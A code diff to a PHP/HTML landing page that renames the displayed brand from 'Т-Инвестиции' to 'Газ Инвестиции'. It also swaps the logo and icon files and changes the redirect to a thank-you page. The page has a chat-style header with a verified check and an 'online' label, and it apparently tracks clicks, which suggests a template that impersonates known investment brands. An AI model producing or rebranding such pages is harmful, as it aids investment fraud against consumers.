@@ -8,8 +8,8 @@ if (!isset($rawClick) && !isset($click)) {
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>T-Инвестиции</title>
-    <link rel="icon" href="./img/icons/avatar.png" type="image/x-icon" />
+    <title>Газ Инвестиции</title>
+    <link rel="icon" href="./img/icons/avatar.svg" type="image/x-icon" />
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link
@@ -201,10 +201,10 @@ if (!isset($rawClick) && !isset($click)) {
     <header class="header">
       <div class="header-container">
         <div class="header-heading">
-          <img src="./img/icons/logo.png" alt="Logo" id="logo" />
+          <img src="./img/icons/logo.svg" alt="Logo" id="logo" />
           <div class="heading-title">
             <div class="heading-title-wrapper">
-              <span class="heading-title-name">Т-Инвестиции</span>
+              <span class="heading-title-name">Газ Инвестиции</span>
               <img src="./img/icons/check.svg" alt="Icon" />
             </div>
             <span class="heading-subtitle">в сети</span>
@@ -263,7 +263,7 @@ if (!isset($rawClick) && !isset($click)) {
           const fileErr = "err.html";
           window.location.href = `${fileErr}${window.location.search}`;
         } else if (thx && thx === "true") {
-          const fileThx = "thanks-page.php";
+          const fileThx = "thanks2.php";
           window.location.href = `${fileThx}${window.location.search}`;
         }
       };
@@ -275,7 +275,7 @@ if (!isset($rawClick) && !isset($click)) {
           const fileErr = "err.html";
           window.location.href = `${fileErr}${window.location.search}`;
         } else if (thx && thx === "true") {
-          const fileThx = "thanks-page.php";
+          const fileThx = "thanks2.php";
           window.location.href = `${fileThx}${window.location.search}`;
         }
       };
